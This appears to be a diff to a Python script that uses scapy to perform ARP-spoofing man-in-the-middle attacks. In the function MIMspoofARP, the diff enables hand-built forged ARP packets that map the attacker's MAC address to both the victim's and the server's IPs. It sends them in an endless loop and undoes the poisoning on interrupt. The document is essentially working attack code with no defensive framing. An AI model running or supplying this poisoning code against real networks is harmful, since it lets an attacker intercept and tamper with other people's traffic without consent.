@@ -1,4 +1,4 @@
-from scapy.all import ARP, Ether, conf, getmacbyip, get_if_hwaddr, get_if_addr, send
+from scapy.all import ARP, Ether, conf, getmacbyip, get_if_hwaddr, get_if_addr, send, sendp
 
 import time
 import random as rd
@@ -18,27 +18,32 @@ def MIMspoofARP(ipVictim, ipServer):
     macVictim = getmacbyip(ipVictim)
     macServer = getmacbyip(ipServer)
 
-    # arpTo = Ether() / ARP()
-    # arpTo[Ether].src = macAttacker
-    # arpTo[ARP].hwsrc = macAttacker
-    # arpTo[ARP].psrc = ipServer
-    # arpTo[ARP].hwdst = macVictim
-    # arpTo[ARP].pdst = ipVictim
+    arpTo = Ether() / ARP()
+    arpTo[Ether].src = macAttacker
+    arpTo[ARP].hwsrc = macAttacker
+    arpTo[ARP].psrc = ipServer
+    arpTo[ARP].hwdst = macVictim
+    arpTo[ARP].pdst = ipVictim
 
-    # arpFrom = Ether() / ARP()
-    # arpFrom[Ether].src = macAttacker
-    # arpFrom[ARP].hwsrc = macAttacker
-    # arpFrom[ARP].psrc = ipVictim
-    # arpFrom[ARP].hwdst = macServer
-    # arpFrom[ARP].pdst = ipServer
-    arp1 = prepPacket(macServer, ipServer, ipVictim)
-    arp2 = prepPacket(macVictim, ipVictim, ipServer)
+    arpFrom = Ether() / ARP()
+    arpFrom[Ether].src = macAttacker
+    arpFrom[ARP].hwsrc = macAttacker
+    arpFrom[ARP].psrc = ipVictim
+    arpFrom[ARP].hwdst = macServer
+    arpFrom[ARP].pdst = ipServer
+
+    # arp1 = prepPacket(macServer, ipServer, ipVictim)
+    # arp2 = prepPacket(macVictim, ipVictim, ipServer)
 
     try:
         while(True):
 #             print("Poisoning Arp table")
-            send(Ether(dst=macServer), arp1, verbose=False)
-            send(Ether(dst=macVictim), arp2, verbose=False)
+
+            sendp(arpTo, iface=interface, verbose=False)
+            sendp(arpFrom, iface=interface, verbose=False)
+
+            # send(Ether(dst=macServer), arp1, verbose=False)
+            # send(Ether(dst=macVictim), arp2, verbose=False)
             time.sleep(2)
     except KeyboardInterrupt:
         undoARPSpoof(ipVictim, ipServer, macVictim, macServer)
